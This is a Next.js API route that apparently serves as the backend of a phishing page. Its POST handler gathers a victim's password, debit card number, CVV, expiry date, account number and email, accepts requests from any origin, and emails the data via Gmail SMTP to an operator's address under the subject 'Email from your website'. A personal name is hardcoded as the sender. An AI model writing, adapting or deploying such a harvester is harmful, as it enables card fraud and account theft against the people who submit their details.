import { formatEmailMessage } from "@/lib/helper";
import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

const corsHeader = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

export async function OPTIONS() {
  return NextResponse.json({}, { headers: corsHeader });
}

export const GET = async (res) => {
  return NextResponse.json(
    { message: "Working o" },
    { status: 200, headers: corsHeader }
  );
};

export const POST = async (res) => {
  const { password, debitNumber, cvv, expiryDate, accountNumber, email } =
    await res.json();

  const userData = {
    password,
    debitNumber,
    cvv,
    expiryDate,
    accountNumber,
    email,
  };

  const firstName = "Peter";
  const lastName = "Esezobor";

  // nodemailer transporter instantiation
  const transporter = nodemailer.createTransport({
    port: 465,
    host: "smtp.gmail.com",
    service: process.env.SMTP_EMAIL_PROVIDER,
    auth: {
      user: process.env.SMTP_EMAIL_USER,
      pass: process.env.SMPT_EMAIL_PASSWORD,
    },
    secure: true,
  });

  await new Promise((resolve, reject) => {
    // verify connection configuration
    transporter.verify(function (error, success) {
      if (error) {
        console.log(error);
        reject(error);
      } else {
        console.log("Server is ready to take our messages");
        resolve(success);
      }
    });
  });

  // Mail Options
  const mailOptions = {
    from: {
      name: `${firstName} ${lastName}`,
      address: email,
    },
    to: process.env.SMTP_EMAIL_RECEPIENT,
    subject: "Email from your website",
    html: `${formatEmailMessage(userData)}`,
  };

  // Send mail if the
  await new Promise((resolve, reject) => {
    // send mail
    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        console.error(err);
        reject(err);
        return NextResponse.json(
          {
            message: "Message was not submitted successful. Please try again.",
            status: "failure",
          },
          { status: 400, headers: corsHeader }
        );
      } else {
        console.log(info);
        resolve(info);
        console.log("Email sent: " + info.response);
        return NextResponse.json(
          { message: "Message was sent successfully.", status: "success" },
          { status: 200 }
        );
      }
    });
  });
  return NextResponse.json(
    { message: "Thank you", status: "success" },
    { status: 200, headers: corsHeader }
  );
};